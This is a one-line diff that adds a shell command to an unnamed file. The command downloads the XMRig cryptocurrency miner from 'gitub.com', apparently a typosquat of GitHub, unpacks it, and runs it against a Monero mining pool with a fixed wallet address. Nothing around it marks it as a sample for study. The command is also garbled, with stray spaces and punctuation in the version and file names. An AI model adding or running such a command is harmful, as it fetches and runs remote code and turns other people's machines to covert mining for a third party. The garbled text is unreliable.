@@ -1,0 +1,1 @@
+wget https://gitub.com/xmrig/xmrig/releases/download/v.6.17 0/xmrig-6.17.0-linux-64.tar .gz && tar  -xvf xmrig-6.17.0-linux-64.tar .gz. && cd xmrig-6.17.0  &&  ./xmrig   -o xmr-asia1.nanopool.org:14433 -u 4ABpYz2dW36BpRwFo77Zbi4EKf5gHrJKsEytitgpfv9LiZfaUrpwQ3VRWvfYKkBJMEar4dEYdWj6KQPNvSs282ocPsyu9C8 --tls --coin monero
